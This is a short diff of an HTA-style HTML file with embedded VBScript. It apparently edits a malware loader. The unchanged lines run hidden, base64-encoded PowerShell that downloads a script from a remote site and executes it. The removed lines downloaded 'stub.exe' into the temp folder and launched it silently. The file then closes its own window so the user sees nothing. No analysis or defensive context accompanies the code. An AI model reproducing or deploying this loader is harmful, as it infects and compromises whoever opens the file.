@@ -3,12 +3,6 @@
 Dim shell
 Set shell = CreateObject("WScript.Shell")
 shell.Run "powershell -encodedCommand aQB3AHIAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAG8AZABlAGYAbwByAGYAdQBuAC4AdgBlAHIAYwBlAGwALgBhAHAAcAAvAHMAaQBnAG0AYQAnACkAIAB8ACAAaQBlAHgA==", 0
-
-downloadUrl = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
-localPath = shell.ExpandEnvironmentStrings("%temp%\stub.exe")
-powershellCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & localPath & "'; Start-Process '" & localPath & "'"""
-shell.Run powershellCommand, 0, True
-
 window.close
 </script>
 </html>
